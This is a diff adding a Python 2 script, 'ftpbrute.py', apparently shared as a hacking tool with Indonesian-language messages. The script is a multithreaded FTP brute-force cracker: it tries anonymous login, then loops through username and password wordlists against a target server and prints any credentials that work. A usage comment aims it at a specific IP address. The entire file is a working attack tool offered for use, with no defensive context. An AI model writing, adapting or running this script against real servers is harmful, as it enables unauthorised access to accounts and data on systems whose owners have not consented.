@@ -1,0 +1,100 @@
+#me@gnomeselpa:~# python ftpbrute.py
+#Usage: python ftpbrute.py <server> <userlist> <wordlist>
+#ex: python ftpbtrute.py 207.191.77.19 user.txt pass.txt
+
+
+#!usr/bin/python
+#FtpBruteForcer
+
+import threading, time, random, sys, ftplib
+from ftplib import FTP
+from copy import copy
+
+
+
+
+if len(sys.argv) !=4:
+   print "\033[35;1mMasukin Target Yg Bener Kang.!!! \033[0m"
+   sys.exit(1)
+
+try:
+     users = open(sys.argv[2], "r").readlines()
+except(IOError):
+     print "Error: Tempat Userlist dan Passlist \n"
+     sys.exit(1)
+  
+try:
+     words = open(sys.argv[3], "r").readlines()
+except(IOError):
+     print "Error: Tempat Userlist dan Passlist \n"
+     sys.exit(1)
+
+print "\t          ============================"
+print "\t            \033[37;1mFTP Brute Force Berjalan\033[0m"
+print "\t          ============================\n"
+print "[+] Server:",sys.argv[1]
+print "[+] User yg ada di Userlist :",len(users)
+print "[+] Pass yg ada di Passlist:",len(words),"\n"
+
+try:
+   f = FTP(sys.argv[1])
+   print "[+] Response:",f.getwelcome()
+except (ftplib.all_errors):
+   pass
+
+try:
+   print "\n[+] Checking for anonymous login\n"
+   ftp = FTP(sys.argv[1])
+   ftp.login()
+   ftp.retrlines('LIST')
+   print "\t\n\033[32;1mAnonymous login successful!!! \033[0m\n"
+   ftp.quit()
+except (ftplib.all_errors):
+   print "\t\033[31;1mAnonymous login Galal \033[0m\n"
+
+wordlist = copy(words)
+
+def reloader():
+   for word in wordlist:
+      words.append(word)
+
+def getword():
+   lock = threading.Lock()
+   lock.acquire()
+   if len(words) != 0:
+      value = random.sample(words,  1)
+      words.remove(value[0])      
+   else:
+      print "\nReloading Wordlist - Changing User\n"
+      reloader()
+      value = random.sample(words,  1)
+      users.remove(users[0])
+      
+   lock.release()
+   if len(users) ==1:
+      return value[0][:-1], users[0]
+   else:
+      return value[0][:-1], users[0][:-1]
+      
+class Worker(threading.Thread):
+    
+   def run(self):
+      value, user = getword()
+      try:
+         print "-"*12
+         print "User:",user,"Password:",value
+         ftp = FTP(sys.argv[1])
+         ftp.login(user, value)
+         ftp.retrlines('LIST')
+         print "\t\nLogin successful:",value, user
+         ftp.quit()
+         work.join()
+         sys.exit(2)
+      except (ftplib.all_errors), msg:
+         #print"An error occurred:", msg
+         pass
+
+for i in range(len(words)*len(users)):
+   work = Worker()
+   work.start()
+   time.sleep(1)
